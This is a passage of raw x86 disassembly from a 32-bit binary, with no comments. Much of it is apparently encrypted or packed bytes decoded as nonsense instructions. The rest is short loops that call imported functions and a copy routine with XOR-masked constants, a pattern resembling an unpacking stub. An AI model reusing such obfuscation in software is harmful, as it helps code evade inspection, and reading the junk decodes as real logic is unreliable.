  4029e7:	mov    ebx,0x88d289b6
  4029ec:	lods   al,BYTE PTR ds:[esi]
  4029ed:	sub    DWORD PTR [edi],esi
  4029ef:	push   esi
  4029f0:	mov    ds:0x21e3f96e,al
  4029f5:	out    0xaf,al
  4029f7:	out    0x95,eax
  4029f9:	add    eax,0x903f127e
  4029fe:	push   ss
  4029ff:	popf   
  402a00:	aam    0x9e
  402a02:	sbb    DWORD PTR ds:[esi+0x619fd5f5],esp
  402a09:	adc    bl,bl
  402a0b:	js     0x402a34
  402a0d:	pushf  
  402a0e:	xor    al,0x74
  402a10:	adc    ebx,DWORD PTR [edi]
  402a12:	leave  
  402a13:	xor    al,0x29
  402a15:	sub    DWORD PTR [ebp+0x45fa3494],eax
  402a1b:	xor    DWORD PTR [esi],edx
  402a1d:	int    0xc
  402a1f:	je     0x402a3c
  402a21:	and    al,BYTE PTR [bp-0x7fbe]
  402a26:	jle    0x4029e5
  402a28:	mov    ds,WORD PTR [eax]
  402a2a:	add    eax,0xc421c89b
  402a2f:	popa   
  402a30:	push   ecx
  402a31:	adc    al,cl
  402a33:	cmp    eax,0xb55c9723
  402a38:	enter  0x9552,0x39
  402a3c:	jae    0x4029d3
  402a3e:	mov    ds:0x3b730c3a,eax
  402a43:	sub    eax,0xdcf4705e
  402a48:	aam    0x19
  402a4a:	inc    edx
  402a4b:	cmp    eax,0xc6725746
  402a50:	imul   ebx,edx,0x22
  402a53:	mov    esi,0x6a0683a6
  402a58:	push   edi
  402a59:	push   ss
  402a5a:	inc    esp
  402a5b:	dec    eax
  402a5c:	(bad)  
  402a5d:	bound  ebx,QWORD PTR [edi+0x6d]
  402a60:	cli    
  402a61:	push   ss
  402a62:	push   0x1e
  402a64:	mov    dl,0xa4
  402a66:	sub    esi,DWORD PTR [ecx]
  402a68:	or     ebp,0x11
  402a6b:	fs inc eax
  402a6d:	mov    ebx,0x3434a14
  402a72:	sbb    al,0x1a
  402a74:	jmp    0x402b47
  402a79:	in     al,dx
  402a7a:	test   eax,0xb57d3fe8
  402a7f:	sti    
  402a80:	mov    ecx,0xb7fd3b83
  402a85:	jl     0x402a1f
  402a87:	stos   BYTE PTR es:[edi],al
  402a88:	sbb    cl,BYTE PTR [edi+ecx*1]
  402a8b:	jl     0x402b09
  402a8d:	mov    ds:0x6b7c7c7c,al
  402a92:	stc    
  402a93:	fwait
  402a94:	sub    eax,0x703728ab
  402a99:	add    dh,bh
  402a9b:	and    eax,0x900c97fa
  402aa0:	stos   DWORD PTR es:[edi],eax
  402aa1:	je     0x402a6f
  402aa3:	cmc    
  402aa4:	stc    
  402aa5:	ficom  DWORD PTR [ebx]
  402aa7:	(bad)  
  402aa8:	pop    ecx
  402aa9:	lods   al,BYTE PTR ds:[esi]
  402aaa:	or     dl,BYTE PTR [esi-0x67e4450]
  402ab0:	mov    al,ds:0xfc267908
  402ab5:	or     al,0xdc
  402ab7:	xlat   BYTE PTR ds:[ebx]
  402ab8:	ret    0xda8d
  402abb:	push   ecx
  402abc:	test   BYTE PTR ds:0xa25cf114,ch
  402ac2:	mov    al,ds:0xbc393f63
  402ac7:	add    al,0xef
  402ac9:	ss retf 0xe8ea
  402acd:	mov    ecx,0xf9fb909b
  402ad2:	aaa    
  402ad3:	adc    eax,0xa9198b14
  402ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ad9:	sub    DWORD PTR [ebx+eax*1-0x20f1f6c],ebx
  402ae0:	xor    DWORD PTR [ebx-0xb91900b],esp
  402ae6:	popf   
  402ae7:	jmp    0x402aaa
  402ae9:	ins    BYTE PTR es:[edi],dx
  402aea:	addr16 lahf 
  402aec:	cs cwde 
  402aee:	sti    
  402aef:	mov    ds:0xb072360e,eax
  402af4:	int3   
  402af5:	test   BYTE PTR [eax+0x42],0xc0
  402af9:	imul   esi,DWORD PTR [eax],0x9a3a0c8e
  402aff:	cmp    al,BYTE PTR [edx]
  402b01:	dec    eax
  402b02:	fisttp WORD PTR [ecx+0x4691485b]
  402b08:	mov    edx,edi
  402b0a:	and    DWORD PTR [esi],esi
  402b0c:	pop    ss
  402b0d:	pop    ebx
  402b0e:	vmptrst QWORD PTR [edx+0xc8e6ec]
  402b15:	loopne 0x402abd
  402b17:	xchg   esi,eax
  402b18:	nop
  402b19:	daa    
  402b1a:	pop    ss
  402b1b:	outs   dx,BYTE PTR ds:[esi]
  402b1c:	inc    esp
  402b1d:	clc    
  402b1e:	and    al,bh
  402b20:	mov    ah,0xe0
  402b22:	jmp    0x402b33
  402b24:	xor    al,0x66
  402b26:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  402b28:	sub    al,0x77
  402b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b2b:	mov    ah,0xe8
  402b2d:	mov    BYTE PTR [ebx],bh
  402b2f:	xor    BYTE PTR [edi],ch
  402b31:	jne    0x402b67
  402b33:	jg     0x402b47
  402b35:	push   ebp
  402b36:	aaa    
  402b37:	lea    ecx,[ecx-0x6ba6ec50]
  402b3d:	popf   
  402b3e:	imul   esp,DWORD PTR [ecx-0x1a52d954],0xffffffb2
  402b45:	int3   
  402b46:	jbe    0x402b93
  402b48:	xor    edx,edx
  402b4a:	add    DWORD PTR [ebp-0xc],ebx
  402b4d:	jmp    0x402c20
  402b52:	dec    ebx
  402b53:	jge    0x402bcf
  402b55:	cmp    BYTE PTR [edx-0x7d],0x6d
  402b59:	jge    0x402b07
  402b5b:	push   cs
  402b5c:	loope  0x402b36
  402b5e:	call   0xb2fc47cf
  402b63:	(bad)  
  402b65:	jl     0x402b09
  402b67:	jl     0x402be5
  402b69:	jl     0x402bb0
  402b6b:	lods   al,BYTE PTR ds:[esi]
  402b6c:	scas   eax,DWORD PTR es:[edi]
  402b6d:	push   ebp
  402b6e:	sub    al,0x30
  402b70:	not    BYTE PTR [ebp-0x15bc2fc8]
  402b76:	jg     0x402ba9
  402b78:	rcr    dl,1
  402b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b7b:	jle    0x402bb1
  402b7d:	dec    ebx
  402b7e:	test   eax,0x381f4736
  402b83:	pop    ecx
  402b84:	push   es
  402b85:	dec    eax
  402b86:	test   BYTE PTR [edx],dl
  402b88:	adc    al,0x94
  402b8a:	inc    ecx
  402b8b:	loop   0x402b10
  402b8d:	mov    al,0x5e
  402b8f:	(bad)  
  402b90:	lea    edi,[edi-0x3d]
  402b93:	sbb    DWORD PTR [ecx+0x30],ecx
  402b96:	sub    DWORD PTR [ebp+0x42bb3333],0xffffff99
  402b9d:	xor    dh,BYTE PTR [edi+0x1b]
  402ba0:	ins    DWORD PTR es:[edi],dx
  402ba1:	aad    0x53
  402ba3:	iret   
  402ba4:	push   cs
  402ba5:	stos   BYTE PTR es:[edi],al
  402ba6:	mov    al,ds:0x2a401ede
  402bab:	daa    
  402bac:	pop    ds
  402bad:	je     0x402c18
  402baf:	inc    edx
  402bb0:	repnz add edi,DWORD PTR [edi-0x7f]
  402bb4:	sub    bl,BYTE PTR [ebp+edx*8-0x28]
  402bb8:	cmp    al,0xc7
  402bba:	cmp    al,0xa2
  402bbc:	adc    cl,al
  402bbe:	rcl    dh,cl
  402bc0:	int3   
  402bc1:	fisubr WORD PTR [esi-0x59f3df49]
  402bc7:	sahf   
  402bc8:	pop    ebx
  402bc9:	(bad)  
  402bca:	or     eax,DWORD PTR [edi]
  402bcc:	or     eax,0xa2066670
  402bd1:	fstp   QWORD PTR [eax-0x7a]
  402bd4:	sub    eax,0xe0eb2da6
  402bd9:	jbe    0x402b91
  402bdb:	sbb    cl,dh
  402bdd:	out    dx,eax
  402bde:	pop    ds
  402bdf:	or     al,0x7f
  402be1:	cwde   
  402be2:	pop    es
  402be3:	sti    
  402be4:	iret   
  402be5:	xchg   ebp,eax
  402be6:	sbb    cl,BYTE PTR [edx]
  402be8:	and    ebx,0xffffffd8
  402beb:	xchg   ecx,eax
  402bec:	(bad)  
  402bed:	hlt    
  402bee:	les    eax,FWORD PTR [ebx-0x12]
  402bf1:	mov    ecx,gs
  402bf3:	mov    BYTE PTR [eax+edx*1],dh
  402bf6:	push   ebp
  402bf7:	sub    esp,edi
  402bf9:	jno    0x402bf2
  402bfb:	fcomp  DWORD PTR [esi-0x21]
  402bfe:	push   ebx
  402bff:	inc    ecx
  402c00:	fsubr  QWORD PTR [edi-0x53]
  402c03:	or     ah,ah
  402c05:	mov    ch,0x9a
  402c07:	in     al,dx
  402c08:	add    al,0xf
  402c0a:	fdivr  st(7),st
  402c0c:	xor    ebx,ebp
  402c0e:	sti    
  402c0f:	dec    esi
  402c10:	xchg   ebp,eax
  402c11:	dec    ecx
  402c12:	sub    eax,0xcd018dff
  402c17:	xchg   ebp,eax
  402c18:	hlt    
  402c19:	mov    al,ds:0x41bf656c
  402c1e:	dec    ebp
  402c1f:	jb     0x402c7c
  402c21:	mov    eax,DWORD PTR [ebp-0xc]
  402c24:	pop    edi
  402c25:	pop    esi
  402c26:	pop    ebx
  402c27:	leave  
  402c28:	ret    0x10
  402c2b:	push   ebp
  402c2c:	mov    ebp,esp
  402c2e:	sub    esp,0x20
  402c31:	leave  
  402c32:	ret    0x10
  402c35:	push   ebp
  402c36:	mov    ebp,esp
  402c38:	push   ecx
  402c39:	and    DWORD PTR ds:0x42473e,0x0
  402c43:	jmp    0x402c56
  402c48:	xor    eax,eax
  402c4a:	xor    eax,DWORD PTR ds:0x42473e
  402c50:	inc    eax
  402c51:	mov    ds:0x42473e,eax
  402c56:	cmp    DWORD PTR ds:0x42473e,0x1e
  402c5d:	jae    0x402d01
  402c63:	cmp    DWORD PTR ds:0x42473e,0x11
  402c6a:	jne    0x402c83
  402c70:	push   0x0
  402c72:	push   0x44a6e8
  402c77:	push   DWORD PTR [ebp-0x20]
  402c7a:	push   DWORD PTR [ebp-0x14]
  402c7d:	call   DWORD PTR ds:0x4420d0
  402c83:	cmp    DWORD PTR ds:0x42473e,0x10
  402c8a:	jne    0x402c9e
  402c90:	xor    eax,eax
  402c92:	add    eax,DWORD PTR ds:0x42473e
  402c98:	inc    eax
  402c99:	mov    ds:0x42473e,eax
  402c9e:	jmp    0x402c48
  402ca3:	and    DWORD PTR ds:0x4479a4,0x0
  402cad:	mov    edx,DWORD PTR ds:0x4479a4
  402cb3:	inc    edx
  402cb4:	mov    DWORD PTR ds:0x4479a4,edx
  402cba:	cmp    DWORD PTR ds:0x4479a4,0xd
  402cc1:	jne    0x402cda
  402cc7:	push   0x42473a
  402ccc:	push   DWORD PTR [ebp-0x28]
  402ccf:	push   0x3f88
  402cd4:	call   DWORD PTR ds:0x442000
  402cda:	cmp    DWORD PTR ds:0x4479a4,0xc
  402ce1:	jne    0x402cf4
  402ce7:	mov    edx,DWORD PTR ds:0x4479a4
  402ced:	inc    edx
  402cee:	mov    DWORD PTR ds:0x4479a4,edx
  402cf4:	cmp    DWORD PTR ds:0x4479a4,0x17
  402cfb:	jb     0x402cad
  402d01:	push   ecx
  402d02:	mov    eax,0xf89c8535
  402d07:	mov    DWORD PTR ds:0x424732,0x10
  402d11:	cmp    DWORD PTR ds:0x424732,0x0
  402d18:	je     0x402d61
  402d1e:	cmp    DWORD PTR ds:0x424732,0x1d
  402d25:	jne    0x402d4f
  402d2b:	push   0x44a6d0
  402d30:	push   0x44a6d0
  402d35:	push   0x8e35
  402d3a:	push   0x4109ab
  402d3f:	push   0x410971
  402d44:	push   0x410927
  402d49:	call   DWORD PTR ds:0x442348
  402d4f:	mov    edx,DWORD PTR ds:0x424732
  402d55:	dec    edx
  402d56:	mov    DWORD PTR ds:0x424732,edx
  402d5c:	jmp    0x402d11
  402d61:	mov    DWORD PTR [ebp-0x8],eax
  402d64:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402d6b:	mov    edx,DWORD PTR [ebp-0x8]
  402d6e:	push   esi
  402d6f:	mov    ecx,0x7510857
  402d74:	xor    edx,ecx
  402d76:	mov    esi,0x32729e
  402d7b:	push   edi
  402d7c:	mov    edi,DWORD PTR [ebp+0x10]
  402d7f:	add    edx,esi
  402d81:	cmp    edi,edx
  402d83:	je     0x403249
  402d89:	mov    edx,DWORD PTR [ebp-0x8]
  402d8c:	mov    eax,DWORD PTR [ebp-0x4]
  402d8f:	xor    eax,ecx
  402d91:	mov    edi,0xffcd8d62
  402d96:	sub    edi,eax
  402d98:	add    edi,DWORD PTR [ebp+0x10]
  402d9b:	xor    edx,ecx
  402d9d:	add    edx,esi
  402d9f:	cmp    edx,edi
  402da1:	ja     0x4030d5
  402da7:	jmp    0x402f16
  402dac:	sbb    eax,0xa4b3a405
  402db1:	ins    DWORD PTR es:[edi],dx
  402db2:	std    
  402db3:	pop    ebp
  402db4:	mov    eax,0xf4e45e2b
  402db9:	pop    edx
  402dba:	and    DWORD PTR [edi],ecx
  402dbc:	clc    
  402dbd:	push   cs
  402dbe:	jl     0x402e3c
  402dc0:	into   
  402dc1:	jg     0x402e3f
  402dc3:	jl     0x402dcb
  402dc5:	cmp    BYTE PTR [eax-0x7b12fafe],ch
  402dcb:	mov    al,ds:0x47bbb953
  402dd0:	lock add BYTE PTR [ebx-0x44],al
  402dd4:	xchg   edx,eax
  402dd5:	aad    0x6a
  402dd7:	stos   BYTE PTR es:[edi],al
  402dd8:	push   ecx
  402dd9:	jmp    0xbf53:0xa72d2a54
  402de0:	nop
  402de1:	or     esi,DWORD PTR [di-0x30fb]
  402de6:	cmp    edi,0x7b9a1b41
  402dec:	cdq    
  402ded:	mov    dl,0x6
  402def:	mov    eax,0x26e6d60b
  402df4:	mov    ch,0xb9
  402df6:	push   es
  402df7:	sub    bl,BYTE PTR [edi]
  402df9:	pop    ebp
  402dfa:	xor    ebp,ebx
  402dfc:	mov    dh,0x56
  402dfe:	popa   
  402dff:	(bad)  
  402e01:	sub    al,0x91
  402e03:	xchg   edi,eax
  402e04:	xchg   DWORD PTR [eax+0x5e3b08e6],ecx
  402e0a:	cmovne ecx,DWORD PTR fs:[ebp-0x497cc4eb]
  402e12:	ja     0x402e82
  402e14:	mov    dl,0xb0
  402e16:	aas    
  402e17:	pop    edx
  402e18:	cmp    esi,DWORD PTR ds:[ebx-0x419937a7]
  402e1f:	das    
  402e20:	scas   eax,DWORD PTR es:[edi]
  402e21:	dec    edi
  402e22:	dec    esi
  402e23:	sub    eax,0x39a9c61c
  402e28:	out    dx,eax
  402e29:	xchg   BYTE PTR [ebp-0x44],dh
  402e2c:	sbb    al,0x57
  402e2e:	adc    eax,0xdb14fb93
  402e33:	adc    ebp,ebx
  402e35:	sti    
  402e36:	lea    edi,[edx-0x4754dc5e]
  402e3c:	neg    BYTE PTR [ebx-0x7f74608]
  402e42:	mov    edx,0xc01000c8
  402e47:	dec    esp
  402e48:	mov    ch,0xd4
  402e4a:	call   0x44af8bb8
  402e4f:	loope  0x402de6
  402e51:	ja     0x402e8a
  402e53:	fdiv   st(0),st
  402e55:	mov    eax,0x29e17216
  402e5a:	lahf   
  402e5b:	sbb    ah,BYTE PTR [edi+0x28]
  402e5e:	(bad)  
  402e5f:	jae    0x402ec5
  402e61:	ds imul ecx,edx,0xdaf6fae5
  402e68:	push   0xacd61f74
  402e6d:	(bad)  
  402e6e:	mov    cl,0xcf
  402e70:	xlat   BYTE PTR ds:[ebx]
  402e71:	pop    esi
  402e72:	pop    edi
  402e73:	inc    ecx
  402e74:	stc    
  402e75:	les    eax,FWORD PTR [ebx-0x2d]
  402e78:	fcom   DWORD PTR [esi+0x3d91b0b]
  402e7e:	cmp    al,bh
  402e80:	scas   eax,DWORD PTR es:[edi]
  402e81:	xchg   ebp,eax
  402e82:	and    al,0xd8
  402e84:	mov    eax,0x61e09e3c
  402e89:	xor    al,0xed
  402e8b:	test   DWORD PTR [edx],0x4424ccec
  402e91:	into   
  402e92:	not    DWORD PTR [ebx+esi*4]
  402e95:	frstor [ebp+0x4]
  402e98:	lods   eax,DWORD PTR ds:[esi]
  402e99:	jmp    0x402e7b
  402e9b:	in     al,0x1
  402e9d:	inc    ebx
  402e9e:	lods   eax,DWORD PTR ds:[esi]
  402e9f:	xor    BYTE PTR [edx],ah
  402ea1:	xchg   DWORD PTR [ecx],eax
  402ea3:	popa   
  402ea4:	sbb    DWORD PTR [ebx],esi
  402ea6:	xchg   ebp,eax
  402ea7:	and    BYTE PTR [esi+0x5a],ah
  402eaa:	cmp    al,0x42
  402eac:	pop    edx
  402ead:	movd   DWORD PTR [edi],mm1
  402eb0:	push   ecx
  402eb1:	enter  0xe79f,0x57
  402eb5:	stos   BYTE PTR es:[edi],al
  402eb6:	mov    edi,?
  402eb8:	pop    esi
  402eb9:	xor    cl,bh
  402ebb:	retf   0xdc0a
  402ebe:	pop    eax
  402ebf:	int3   
  402ec0:	sbb    al,0xf9
  402ec2:	inc    edx
  402ec3:	enter  0xcc12,0x26
  402ec7:	mov    al,ds:0x6c067f10
  402ecc:	jg     0x402ea7
  402ece:	jbe    0x402ee0
  402ed0:	jne    0x402f0d
  402ed2:	mov    al,0x3c
  402ed4:	add    BYTE PTR [eax],dh
  402ed6:	mov    esi,0xa8661cfd
  402edb:	and    ecx,DWORD PTR [eax+0x63469853]
  402ee1:	lock adc edx,edi
  402ee4:	comiss xmm4,DWORD PTR [ebp+0x46cb0947]
  402eeb:	fistp  QWORD PTR [ecx+0x12523dee]
  402ef1:	les    ebp,FWORD PTR [edx]
  402ef3:	xor    ch,dh
  402ef5:	les    edx,FWORD PTR [esi+0x4eb49c61]
  402efb:	out    0xfe,eax
  402efd:	dec    ebp
  402efe:	std    
  402eff:	rcl    edx,1
  402f01:	mov    cl,0x24
  402f03:	and    esp,DWORD PTR [ebx-0xd]
  402f06:	sub    BYTE PTR [eax],dh
  402f08:	pop    ds
  402f09:	add    eax,0x74376356
  402f0e:	into   
  402f0f:	mov    ecx,0x4707e2f1
  402f14:	pop    eax
  402f15:	in     al,dx
  402f16:	push   ebx
  402f17:	jmp    0x402f21
  402f1c:	mov    esi,0x32729e
  402f21:	mov    eax,DWORD PTR [ebp-0x8]
  402f24:	mov    edi,DWORD PTR [ebp-0x4]
  402f27:	xor    edi,ecx
  402f29:	add    edi,esi
  402f2b:	mov    esi,DWORD PTR [ebp+0x8]
  402f2e:	imul   edi,edx
  402f31:	mov    ebx,DWORD PTR [ebp+0xc]
  402f34:	xor    eax,ecx
  402f36:	add    eax,edx
  402f38:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  402f3f:	mov    BYTE PTR [edi+esi*1],al
  402f42:	mov    eax,DWORD PTR [ebp-0x4]
  402f45:	xor    eax,ecx
  402f47:	lea    edx,[edx+eax*1+0x32729e]
  402f4e:	mov    eax,DWORD PTR [ebp-0x4]
  402f51:	xor    eax,ecx
  402f53:	mov    esi,0xffcd8d62
  402f58:	sub    esi,eax
  402f5a:	add    esi,DWORD PTR [ebp+0x10]
  402f5d:	jmp    0x4030cc
  402f62:	jp     0x402f87
  402f64:	pop    ebp
  402f65:	cmp    BYTE PTR [ebp+0x7a],bl
  402f68:	jge    0x402fcf
  402f6a:	mov    ss,WORD PTR [ebp+0x4f]
  402f6d:	push   edx
  402f6e:	dec    esp
  402f6f:	mov    al,0x51
  402f71:	int3   
  402f72:	dec    edx
  402f73:	add    DWORD PTR [esp+edi*2-0x32],edi
  402f77:	jg     0x402ff5
  402f79:	jl     0x402fdd
  402f7b:	cli    
  402f7c:	enter  0xe58,0xad
  402f80:	adc    BYTE PTR [edi+0x35],cl
  402f83:	cli    
  402f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f85:	xchg   DWORD PTR [ebp+0x19],ebx
  402f88:	jns    0x402f48
  402f8a:	loopne 0x402f44
  402f8c:	pop    ebx
  402f8d:	xor    BYTE PTR [ebp+0x43c4076a],bl
  402f93:	mov    edx,0x58926da6
  402f98:	xor    DWORD PTR [edx],eax
  402f9a:	mov    dh,0x5b
  402f9c:	mov    ebp,0xc43be14a
  402fa1:	push   ss
  402fa2:	or     BYTE PTR [edi+edx*2-0x543eebfe],dh
  402fa9:	sbb    DWORD PTR [edx],0x36
  402fac:	loopne 0x402f69
  402fae:	cmp    DWORD PTR [ebx],0xd525e955
  402fb4:	iret   
  402fb5:	(bad)  
  402fb6:	stc    
  402fb7:	popf   
  402fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fb9:	out    dx,eax
  402fba:	pop    ds
  402fbb:	add    al,0xcf
  402fbd:	sbb    cl,0xb3
  402fc0:	xchg   DWORD PTR [ebx*8+0x7fadd3a7],ebx
  402fc7:	int3   
  402fc8:	add    BYTE PTR [ebp+0xb],dl
  402fcb:	jbe    0x402f52
  402fcd:	fld    QWORD PTR ds:0x66af78d1
  402fd3:	lods   eax,DWORD PTR ds:[esi]
  402fd4:	mov    WORD PTR [ebx+0x1d0101f8],?
  402fda:	sub    BYTE PTR [esi+0x5],0xd0
  402fde:	(bad)  
  402fdf:	xchg   esi,eax
  402fe0:	sbb    eax,0x8f5815b2
  402fe5:	pop    es
  402fe6:	push   ebx
  402fe7:	pop    es
  402fe8:	iret   
  402fe9:	xor    cl,dl
  402feb:	pushf  
  402fec:	test   DWORD PTR ds:0xc474bbe9,0x7ec05960
  402ff6:	push   ebx
  402ff7:	add    DWORD PTR [esi],ebx
  402ff9:	sub    DWORD PTR [ebx],esi
  402ffb:	inc    edx
  402ffc:	rcl    DWORD PTR ds:[edi+eiz*8-0x4e],1
  403001:	cld    
  403002:	das    
  403003:	ror    edx,0xaa
  403006:	cmp    esp,esp
  403008:	aas    
  403009:	cs add al,0x31
  40300c:	loope  0x403062
  40300e:	mov    cl,0x1c
  403010:	pop    ss
  403011:	icebp  
  403012:	add    al,BYTE PTR [ebp+0x63a8b816]
  403018:	pop    ss
  403019:	dec    ebp
  40301a:	sti    
  40301b:	adc    BYTE PTR [ebx+edx*8],al
  40301e:	jnp    0x402ff3
  403020:	icebp  
  403021:	cmp    DWORD PTR [ebx],esi
  403023:	dec    esi
  403024:	pop    edx
  403025:	mov    esp,0x16c33204
  40302a:	shr    BYTE PTR [edi],1
  40302c:	out    0x71,eax
  40302e:	mov    dh,0x4e
  403030:	shl    BYTE PTR [edi],cl
  403032:	xchg   edx,eax
  403033:	stos   WORD PTR es:[edi],ax
  403035:	(bad)  
  403037:	xor    DWORD PTR [esi+ecx*1],ebx
  40303a:	mov    ch,0x9e
  40303c:	(bad)  
  40303d:	xor    al,0x8c
  40303f:	sar    BYTE PTR [eax+ebp*2],cl
  403042:	push   ecx
  403043:	jbe    0x4030b6
  403045:	sti    
  403046:	inc    edx
  403047:	clc    
  403048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403049:	or     edx,DWORD PTR [edx+0x5678fbb0]
  40304f:	sbb    DWORD PTR [edx+0x56661fd4],eax
  403055:	icebp  
  403056:	mov    BYTE PTR [ecx+0x18],dh
  403059:	mov    al,ds:0xccbf9516
  40305e:	jae    0x40308c
  403060:	fwait
  403061:	mov    ds:0x432b6c2,al
  403066:	xchg   ecx,eax
  403067:	out    0x33,eax
  403069:	dec    ebp
  40306a:	mov    cl,0x57
  40306c:	jo     0x403052
  40306e:	cdq    
  40306f:	xchg   edx,eax
  403070:	pop    edx
  403071:	jo     0x403054
  403073:	adc    eax,0x97bb7a4d
  403078:	adc    eax,0xef61f11e
  40307d:	mov    ch,0x9b
  40307f:	ins    BYTE PTR es:[edi],dx
  403080:	cli    
  403081:	inc    DWORD PTR [ecx-0x62]
  403084:	xchg   esi,eax
  403085:	lock lds ebp,FWORD PTR [edx]
  403088:	out    dx,al
  403089:	sub    ah,ah
  40308b:	shr    DWORD PTR [edx+0x1ab6942],1
  403091:	clc    
  403092:	mul    DWORD PTR fs:[ecx]
  403095:	js     0x4030f2
  403097:	jg     0x4030d1
  403099:	call   0xf4556b32
  40309e:	push   eax
  40309f:	cmp    edi,DWORD PTR [edx-0xd7d3f36]
  4030a5:	bound  ebp,QWORD PTR [ecx-0x2ee4a140]
  4030ab:	mov    dl,0xb4
  4030ad:	fsubp  st(1),st
  4030af:	in     al,0x4b
  4030b1:	push   ebp
  4030b2:	adc    al,0x3a
  4030b4:	xchg   edi,eax
  4030b5:	or     eax,0x58421f4a
  4030ba:	pop    es
  4030bb:	js     0x4030a6
  4030bd:	mov    WORD PTR ds:0xf95b38c4,?
  4030c3:	enter  0x90f3,0xb6
  4030c7:	sub    ah,ch
  4030c9:	sbb    DWORD PTR [ebx+edi*8-0x79f029c5],0xfffffe48
  4030d4:	pop    ebx
  4030d5:	mov    eax,0xf89c8534
  4030da:	jmp    0x403249
  4030df:	jno    0x403104
  4030e1:	in     al,0x69
  4030e3:	cli    
  4030e4:	ins    DWORD PTR es:[edi],dx
  4030e5:	cmp    DWORD PTR [ebx+0x12],0x6d299de8
  4030ec:	cmp    bh,cl
  4030ee:	inc    ebx
  4030ef:	sbb    al,0x3
  4030f1:	jl     0x40316f
  4030f3:	into   
  4030f4:	jg     0x403172
  4030f6:	jl     0x4030aa
  4030f8:	shl    DWORD PTR [edi],cl
  4030fa:	scas   eax,DWORD PTR es:[edi]
  4030fb:	call   0x46bc:0x812cd7b9
  403102:	cmc    
  403103:	test   BYTE PTR [ecx],al
  403105:	mov    ds:0x4a7fa401,eax
  40310a:	mov    bl,0xe0
  40310c:	in     al,0x5a
  40310e:	neg    DWORD PTR [eax]
  403110:	add    BYTE PTR [ecx],bh
  403112:	xchg   esp,eax
  403113:	push   ecx
  403114:	dec    eax
  403115:	mov    esp,0x6f72839a
  40311a:	lods   eax,DWORD PTR ds:[esi]
  40311b:	push   cs
  40311c:	cmc    
  40311d:	jp     0x4030df
  40311f:	push   ecx
  403120:	out    0xf3,al
  403122:	jg     0x4030de
  403124:	pop    ebp
  403125:	mov    BYTE PTR [ebp-0x23157c88],cl
  40312b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40312c:	jge    0x403176
  40312e:	comiss xmm3,DWORD PTR [eax+0x180d23be]
  403135:	int3   
  403136:	adc    BYTE PTR [ecx],al
  403138:	jne    0x403133
  40313a:	out    dx,al
  40313b:	cld    
  40313c:	mov    bl,0xde
  40313e:	and    eax,0x72ed818e
  403143:	lock dec ecx
  403145:	ss out 0x26,eax
  403148:	mov    cl,0x4b
  40314a:	pop    ebx
  40314b:	stos   DWORD PTR es:[edi],eax
  40314c:	cmp    eax,0x5a52e1d7
  403151:	push   ss
  403152:	xor    eax,0x503cd0e9
  403157:	dec    esp
  403158:	repnz sub eax,0x5a02f0
  40315e:	pop    ss
  40315f:	mov    ch,0x62
  403161:	dec    ecx
  403162:	loope  0x4031d7
  403164:	mov    esp,0xed983712
  403169:	fdivrp st(4),st
  40316b:	out    dx,al
  40316c:	cmp    dl,BYTE PTR [ebp+0x63c1435f]
  403172:	jge    0x403113
  403174:	inc    edx
  403175:	sbb    BYTE PTR [eax-0x97a65a9],ah
  40317b:	aam    0x29
  40317d:	sbb    al,BYTE PTR [edi+0x79]
  403180:	ds nop
  403182:	push   ss
  403183:	mov    ds:0x12a1d959,eax
  403188:	dec    ebx
  403189:	inc    ebx
  40318a:	enter  0xf424,0x79
  40318e:	lds    ebp,FWORD PTR cs:[ecx-0x69d5d97f]
  403195:	(bad)  
  403196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403197:	cmp    eax,0xf1d40adf
  40319c:	stos   DWORD PTR es:[edi],eax
  40319d:	aas    
  40319e:	or     al,0x12
  4031a0:	jp     0x4031f9
  4031a2:	inc    ecx
  4031a4:	push   ecx
  4031a5:	jg     0x4031b7
  4031a7:	hlt    
  4031a8:	dec    esi
  4031a9:	mov    ss,esp
  4031ab:	push   0xee32a8bf
  4031b0:	pop    edx
  4031b1:	sub    dh,BYTE PTR [ebp+0x790fd5c]
  4031b7:	call   0x75cdd59b
  4031bc:	jp     0x403174
  4031be:	dec    edi
  4031bf:	icebp  
  4031c0:	rdmsr  
  4031c2:	aaa    
  4031c3:	leave  
  4031c4:	pop    eax
  4031c5:	push   edi
  4031c6:	mov    edx,0x99e32767
  4031cb:	adc    bh,al
  4031cd:	jnp    0x40317f
  4031cf:	cmp    al,BYTE PTR cs:0xd7eac572
  4031d6:	retf   
  4031d7:	mov    dh,0x52
  4031d9:	pop    ebp
  4031da:	jbe    0x403246
  4031dc:	mov    edx,0xf2d7bf74
  4031e1:	sub    eax,DWORD PTR [edi]
  4031e3:	icebp  
  4031e4:	cs xchg ebp,eax
  4031e6:	dec    esp
  4031e7:	jbe    0x40321d
  4031e9:	cmp    ebx,ebp
  4031eb:	pop    edx
  4031ec:	sbb    eax,0x3a910503
  4031f1:	push   0xfffffffb
  4031f3:	sahf   
  4031f4:	xor    DWORD PTR [ecx],esp
  4031f6:	sub    BYTE PTR [eax-0x6b52859f],bl
  4031fc:	inc    esp
  4031fd:	aas    
  4031fe:	daa    
  4031ff:	sub    dh,BYTE PTR [edi]
  403201:	hlt    
  403202:	pushf  
  403203:	ss dec esp
  403205:	jb     0x403211
  403207:	pop    esp
  403208:	std    
  403209:	aas    
  40320a:	call   FWORD PTR [ecx+0xd]
  40320d:	stc    
  40320e:	into   
  40320f:	xor    DWORD PTR [eax+0x5a],ebx
  403212:	xchg   ecx,eax
  403213:	xchg   ecx,eax
  403214:	cmp    DWORD PTR [esi],eax
  403216:	xchg   ebp,eax
  403217:	cmp    BYTE PTR [eax],0xe1
  40321a:	rol    BYTE PTR [eax],1
  40321c:	add    DWORD PTR [esi],ebp
  40321e:	inc    esp
  40321f:	sbb    bh,BYTE PTR [edx-0x64e54cc5]
  403225:	fadd   st(7),st
  403227:	push   ds
  403228:	in     al,0xec
  40322a:	sbb    esp,DWORD PTR [esi+0x2f]
  40322d:	iret   
  40322e:	ret    
